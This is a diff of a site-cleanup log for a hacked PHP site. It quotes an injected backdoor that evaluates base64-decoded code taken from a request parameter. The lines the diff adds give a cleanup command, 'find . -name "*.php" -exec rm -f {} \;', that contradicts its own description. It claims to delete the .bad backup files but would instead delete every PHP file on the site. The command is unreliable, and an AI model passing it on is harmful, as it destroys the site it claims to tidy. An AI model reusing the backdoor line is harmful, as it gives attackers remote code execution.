@@ -47,7 +47,11 @@ Clean up:
 		 defined('_OLD_JEXEC_') or die(@eval(base64_decode($_REQUEST['comment'])));
 		?><?php...
 		
-	I wrote and ran the cleanup.py script to deal with those.
+	I wrote and ran the cleanup.py script to deal with those. The script creates back up
+	copies of every file modified by adding the extension .bad to the file name. Once the 
+	site is restored these can be deleted with
+	
+		find . -name "*.php" -exec rm -f {} \;
 	
 6.	Checked the .htaccess files
 
